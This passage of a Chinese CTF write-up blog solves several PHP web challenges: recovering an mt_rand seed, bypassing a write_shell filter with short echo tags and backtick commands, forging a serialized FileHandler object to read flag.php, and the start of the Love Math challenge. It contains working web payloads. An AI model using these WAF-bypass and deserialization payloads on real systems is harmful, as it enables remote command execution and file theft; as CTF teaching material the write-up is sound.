class="hljs-selector-attr">[j]</span>:<br>            result += <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> +<span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + length + <span class="hljs-string">&#x27; &#x27;</span><br>            break<br><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">5</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">9</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">14</span> <span class="hljs-number">14</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">35</span> <span class="hljs-number">35</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">60</span> <span class="hljs-number">60</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">22</span> <span class="hljs-number">22</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">9</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">33</span> <span class="hljs-number">33</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p>3.下载php_mt_seed工具并且使用</p><p><img src="https://i.imgs.ovh/2023/11/20/HODpv.png" alt="image-20231120213315052"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">17749670</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;p1&#x27;</span>&gt;</span>fjoC9Ygwj7O4LXcygiZf<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>上传得到flag</p><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>提供了查看路径和写入文件的功能，但是存在WAF机制，不允许写入黑名单中的内容。</p><p>使用echo标记简写<code>&lt;?=</code>绕过<code>&lt;?php </code>的限制，再用<code>.</code>来连接p和hp，因为分号被过滤掉了，只执行一行语句可以省略：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/?action=upload&amp;<span class="hljs-class"><span class="hljs-keyword">data</span>=&lt;?=(<span class="hljs-title">ph</span>.<span class="hljs-title">pinfo</span>)()?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/?action=upload&amp;<span class="hljs-class"><span class="hljs-keyword">data</span>=&lt;?=(<span class="hljs-title">ph</span>.<span class="hljs-title">pinfo</span>)()?&gt;</span><br></code></pre></td></tr></table></figure><p>访问发现写入成功</p><p>查询文件，用%09代替空格：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?a</span>ction=upload&amp;data=&lt;<span class="hljs-string">?=</span><span class="hljs-string">`ls%09/`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看flag</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?a</span>ction=upload&amp;data=&lt;<span class="hljs-string">?=</span><span class="hljs-string">`cat%09/flllllll1112222222lag`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>      <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>        <span class="hljs-keyword">die</span>();<br>      &#125;<br>      <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>      <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>      <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>      <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>  &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>  <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>get传入一个序列化后的类对象</p><p>需要绕过</p><p><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascli值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00,不符合上面的要求。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>destruct()魔术方法</strong><br>op&#x3D;&#x3D;&#x3D;”2”，是强比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>KOTLIN<br></code></pre></td></tr></table></figure><p>而在process()函数中，op&#x3D;&#x3D;”2”是弱比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>所以可以使传入的op为数字2，从而使第一个强比较返回false，而使第二个弱比较返回true</p><p>序列化操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-comment">#public  $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//因为destruct函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">?<span class="hljs-built_in">str</span>=O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span 